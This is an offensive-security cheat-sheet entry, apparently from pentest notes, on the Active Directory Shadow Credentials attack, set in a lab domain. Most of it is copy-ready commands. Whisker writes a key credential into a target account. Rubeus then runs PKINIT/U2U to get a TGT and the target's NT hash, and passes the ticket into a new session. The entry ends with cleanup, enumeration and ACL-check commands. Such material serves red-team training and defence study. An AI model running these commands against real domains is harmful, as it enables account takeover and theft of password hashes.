# 11.06 Shadow Credentials Whisker

> Inject a Key Credential via `Whisker`, then `Rubeus` PKINIT + U2U to recover the target's NT hash via Shadow Credentials.

## Overview

Shadow Credentials abuse the msDS-KeyCredentialLink attribute by injecting a certificate Key Credential into a target account. Requires GenericAll/GenericWrite or WriteProperty on msDS-KeyCredentialLink. After adding the credential, Rubeus uses PKINIT to request a TGT and extract the NTLM hash via U2U (User-to-User) authentication. Cleanup is done by removing the injected device ID.

## Steps

- Enumerate existing key credentials with Whisker list before making changes.
- Run Whisker add to generate a certificate and get the ready-to-use Rubeus command.
- Run Rubeus asktgt with /getcredentials /show to obtain the TGT and recover the NT hash from the PAC.
- Create a sacrificial logon session with Rubeus createnetonly so the ticket doesn't pollute the current session.
- Import the TGT into the new session with Rubeus ptt.
- Clean up by removing the injected device ID with Whisker remove /deviceid.
- Can also use Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)' to enumerate accounts already using Key Trust.

## Commands

### Enumerate key credentials on target

```powershell
.\Whisker.exe list /target:gabriel
```

### Add shadow credential (generates cert + prints Rubeus command)

```powershell
.\Whisker.exe add /target:gabriel
```

### Request TGT + extract NTLM hash via PKINIT/U2U

```powershell
.\Rubeus.exe asktgt /user:gabriel /certificate:MIIJuAIBAzCCCXQGC..SNIP...6F9yJkzw28UnNcCs/0aclXHfAwICB9A= /password:"cw7I7QaHMS44q5xt" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show /nowrap
```

### Create sacrificial logon session

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

### Import TGT into session (Pass the Ticket)

```powershell
.\Rubeus.exe ptt /ticket:doIGJjCCBiKgAwIBBaEDAgEWooIFRTCCBUFhggU9MIIFOaADA...SNIP...
```

### Remove injected key credential

```powershell
.\Whisker.exe remove /target:gabriel /deviceid:48d97546-cac9-4e92-981b-e89da231f7a8
```

### Enumerate users with non-empty msDS-KeyCredentialLink

```powershell
Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'
```

### Check Jeffry's ACL over Gabriel (dacledit)

```bash
python3 examples/dacledit.py -target gabriel -principal jeffry -dc-ip <TARGET> lab.local/jeffry:Music001
```
